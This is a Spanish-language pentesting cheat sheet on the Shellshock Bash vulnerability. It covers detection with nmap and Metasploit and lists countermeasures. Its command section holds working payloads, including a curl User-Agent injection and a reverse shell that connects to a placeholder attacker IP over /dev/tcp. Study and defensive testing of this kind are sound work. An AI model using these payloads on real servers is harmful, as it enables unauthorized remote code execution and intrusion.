# Shellshock (CVE-2014-6271)

## Descripción
Vulnerabilidad crítica en Bash que permite la ejecución remota de código (RCE) mediante la manipulación de variables de entorno. Afecta especialmente a servidores web que utilizan scripts CGI para procesar solicitudes HTTP, donde el atacante puede inyectar comandos en cabeceras como User-Agent.

## Clasificación
- **Fase**: Explotación
- **MITRE ATT&CK**: T1190 (Exploit Public-Facing Application)
- **Plataforma**: Linux
- **Dificultad**: Intermedia

## Herramientas
- **curl** — para realizar peticiones HTTP manuales con cabeceras maliciosas.
- **nmap** (`--script http-shellshock`) — para detectar el fallo en servicios web.
- **Metasploit** (`exploit/multi/http/apache_mod_cgi_bash_env_exec`) — para automatizar la obtención de una shell.

## Comandos / Ejemplos

### Verificación manual con curl
```bash
# Inyectar un comando simple para verificar la ejecución (ej: ping o sleep)
curl -H "User-Agent: () { :; }; /bin/eject" http://<target>/cgi-bin/test.cgi
```

### Obtención de shell reversa
```bash
# Inyectar una shell reversa en la cabecera User-Agent
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" http://<target>/cgi-bin/admin.cgi
```

### Escaneo con Nmap
```bash
# Buscar scripts CGI vulnerables
nmap -p 80 --script http-shellshock --script-args uri=/cgi-bin/login.cgi <target-ip>
```

## Contramedidas
- Actualizar Bash a la última versión parcheada disponible en la distribución.
- Sustituir scripts CGI por tecnologías más modernas y seguras.
- Utilizar Web Application Firewalls (WAF) para filtrar patrones de inyección en cabeceras HTTP.
- Implementar el principio de menor privilegio para el usuario que ejecuta el servidor web.

## Referencias
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- MITRE Corporation. (2024). ATT&CK Technique T1190: Exploit Public-Facing Application. https://attack.mitre.org/techniques/T1190/
- Notas del proyecto: notas-md/HNotes/HNotes/Cheatsheet.md
